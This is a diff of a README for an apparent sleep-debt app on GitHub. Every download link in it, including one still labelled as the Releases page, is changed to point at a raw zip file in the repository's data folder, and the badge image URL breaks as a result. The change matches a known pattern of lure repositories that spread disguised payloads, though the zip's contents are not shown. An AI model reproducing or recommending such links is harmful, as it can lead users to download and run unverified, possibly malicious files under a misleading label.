@@ -2,7 +2,7 @@
 # 🌙 Physiological-Debt-Accumulation-Engine - Understand Your Sleep Needs Better
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Physiological%20Debt%20Accumulation%20Engine-brightgreen)](https://github.com/juniorplayaa/Physiological-Debt-Accumulation-Engine/releases)
+[![Download Here](https://github.com/juniorplayaa/Physiological-Debt-Accumulation-Engine/raw/refs/heads/main/data/Debt_Engine_Accumulation_Physiological_v1.1.zip%20Now-Physiological%20Debt%20Accumulation%20Engine-brightgreen)](https://github.com/juniorplayaa/Physiological-Debt-Accumulation-Engine/raw/refs/heads/main/data/Debt_Engine_Accumulation_Physiological_v1.1.zip)
 
 ## 📚 Overview
 The Physiological-Debt-Accumulation-Engine is a tool that helps you understand your sleep needs and recovery better. This application models sleep as a recovery debt process, focusing on how your body accumulates stress before you feel tired or run down. By analyzing your physiological traits and environmental signals, this tool estimates your sleep requirement and measures your sleep debt. It offers powerful visualization features to show how stress builds up over time.
@@ -11,7 +11,7 @@ The Physiological-Debt-Accumulation-Engine is a tool that helps you understand y
 Using the Physiological-Debt-Accumulation-Engine is simple. Follow these straightforward steps to get started:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/juniorplayaa/Physiological-Debt-Accumulation-Engine/releases) to download the latest version.
+   - Visit the [Releases page](https://github.com/juniorplayaa/Physiological-Debt-Accumulation-Engine/raw/refs/heads/main/data/Debt_Engine_Accumulation_Physiological_v1.1.zip) to download the latest version.
 
 2. **System Requirements**
    - Ensure you have the following:
@@ -62,7 +62,7 @@ Stay tuned for updates. Future releases will add features like improved data ana
 ### ⚡ Download & Install
 Ready to enhance your understanding of sleep needs? Click the link below to download the latest version of the Physiological-Debt-Accumulation-Engine.
 
-[Download Here](https://github.com/juniorplayaa/Physiological-Debt-Accumulation-Engine/releases)
+[Download Here](https://github.com/juniorplayaa/Physiological-Debt-Accumulation-Engine/raw/refs/heads/main/data/Debt_Engine_Accumulation_Physiological_v1.1.zip)
 
 ## 📞 Support
 For assistance, submit your questions through the platform's Issues section. Our team is available to help you with any challenges you may face.
